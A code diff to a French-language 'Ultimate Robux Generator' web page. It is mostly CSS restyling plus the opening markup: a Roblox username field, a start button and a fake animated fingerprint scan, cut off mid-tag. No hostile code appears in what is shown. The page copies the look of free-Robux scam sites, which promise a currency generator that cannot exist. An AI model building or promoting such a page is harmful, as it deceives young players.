@@ -6,7 +6,6 @@
 <title>Ultimate Robux Generator - Niveau ULTIME 🐐</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-
   /* RESET & BASE */
   * {
     box-sizing: border-box;
@@ -29,7 +28,6 @@
     justify-content: center;
     align-items: center;
   }
-
   /* TITRE GLITCH */
   h1 {
     font-size: 2.8rem;
@@ -44,7 +42,6 @@
       0 0 20px #FFD700,
       0 0 40px #FFA500;
   }
-
   @keyframes glitch {
     0%, 100% { text-shadow: 
       0 0 5px #fff,
@@ -77,14 +74,12 @@
         2px -2px red;
     }
   }
-
   /* SAC & BORDURES DORÉES */
   .gold-border {
     border: 2.5px solid #FFD700;
     border-radius: 15px;
     box-shadow: 0 0 15px #FFD700aa;
   }
-
   /* SAC D'ARGENT ANIMÉ */
   .money-bag {
     font-size: 4rem;
@@ -96,7 +91,6 @@
     0%, 100% { transform: scale(1); filter: drop-shadow(0 0 5px #FFD700); }
     50% { transform: scale(0.85); filter: drop-shadow(0 0 15px #FFD700); }
   }
-
   /* INPUT PSEUDO */
   input#pseudo {
     width: 100%;
@@ -118,7 +112,6 @@
     border-color: #FFEA00;
     box-shadow: 0 0 35px #FFD700cc inset;
   }
-
   /* MESSAGE D'ERREUR */
   .error-message {
     color: #ff4444;
@@ -127,7 +120,6 @@
     text-align: center;
     min-height: 1.2rem;
   }
-
   /* BOUTONS */
   button {
     background: linear-gradient(45deg, #FFD700, #FFAA00);
@@ -156,7 +148,6 @@
   button:active {
     transform: scale(0.95);
   }
-
   /* FINGERPRINT SCAN */
   .fingerprint-container {
     margin-top: 20px;
@@ -177,7 +168,6 @@
     0%, 100% { filter: drop-shadow(0 0 10px #FFD700); }
     50% { filter: drop-shadow(0 0 30px #FFEB3B); }
   }
-
   /* PROGRESS BAR */
   .progress-bar {
     width: 100%;
@@ -199,7 +189,6 @@
     border-radius: 12px;
     transition: width 0.4s ease-in-out;
   }
-
   /* MESSAGE FINAL */
   .final-message {
     margin-top: 20px;
@@ -207,31 +196,32 @@
     font-size: 1.2rem;
     color: #FFD700;
     font-weight: 700;
-    min-height: 2.4rem;
+    min-height: 3rem;
     text-shadow: 0 0 15px #FFEA00;
   }
-
   /* AVERTISSEMENT */
   .warning {
-    margin-top: 20px;
+    margin-top: 25px;
     color: #FFAA00;
     font-size: 1.1rem;
     font-weight: 700;
     display: flex;
     justify-content: center;
     align-items: center;
-    gap: 8px;
+    gap: 10px;
     text-shadow: 0 0 5px #FFAA00;
   }
   .warning span {
-    font-size: 1.4rem;
+    font-size: 1.5rem;
   }
-
-  /* PAGE HIDDEN */
+  /* PAGES cachées */
+  .page {
+    width: 100%;
+    max-width: 420px;
+  }
   .hidden {
     display: none !important;
   }
-
   /* RESPONSIVE */
   @media (max-width: 460px) {
     #app {
@@ -252,16 +242,20 @@
 </style>
 </head>
 <body>
-
 <div id="app">
+
   <h1>💰 Ultimate Robux Generator</h1>
 
-  <!-- PAGE 1: Entrée Pseudo + Validation -->
-  <div id="page1" class="page gold-border">
+  <!-- PAGE 1: Pseudo + Validation -->
+  <section id="page1" class="page gold-border">
     <div class="money-bag">💰</div>
     <input type="text" id="pseudo" placeholder="Tape ton pseudo Roblox ici..." autocomplete="off" />
     <div class="error-message" id="error1"></div>
     <button id="btnStart">▶ DÉMARRER</button>
-  </div>
+  </section>
 
-  <!-- PAGE 2: Empreinte digitale + validation
+  <!-- PAGE 2: Empreinte digitale + scan -->
+  <section id="page2" class="page gold-border hidden">
+    <div class="fingerprint-container">
+      <div class="fingerprint" aria-label="Empreinte digitale animée"></div>
+      <div style="font-weight
